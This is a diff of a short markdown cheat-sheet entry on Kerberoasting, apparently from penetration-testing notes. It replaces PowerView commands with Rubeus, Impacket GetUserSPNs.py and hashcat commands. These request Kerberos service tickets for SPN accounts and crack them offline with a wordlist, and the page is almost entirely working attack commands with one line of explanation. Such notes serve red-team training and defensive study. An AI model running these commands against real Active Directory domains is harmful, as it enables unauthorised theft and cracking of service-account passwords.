@@ -1,13 +1,23 @@
 # Kerberoasting
 
-Kerberoasting (STILL WORKING ON THIS)
+#### Kerberoasting
 
+> **Kerberoasting** allows a user to request a service ticket for any service with a registered **SPN** then use that ticket to crack the service password.
+
+* **Rubeus** (local):
+
+```powershell
+.\Rubeus.exe kerberoast
 ```
-Get-DomainSPNTicket -Credential $cred -OutputFormat hashcat
 
-Invoke-Kerberoast -OutputFormat Hashcat
-Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'C:\Users\Administrator\Music\hash_capture.txt' -Width 8000
+* **Impacket** (remote):
 
-GetUserSPNs.py <domain>/<username>:<password> -dc-ip <DC IP> -request
-hashcat -m 13100 -a 0 spn.txt /usr/share/wordlists/rockyou.txt
+```bash
+GetUserSPNs.py <Domain>/<username>:<password> -dc-ip <IP> -request
+```
+
+* Cracking Kerberos 5 etype 23 TGS-REP:
+
+```bash
+hashcat -m 13100 -a 0 hash.txt Pass.txt
 ```
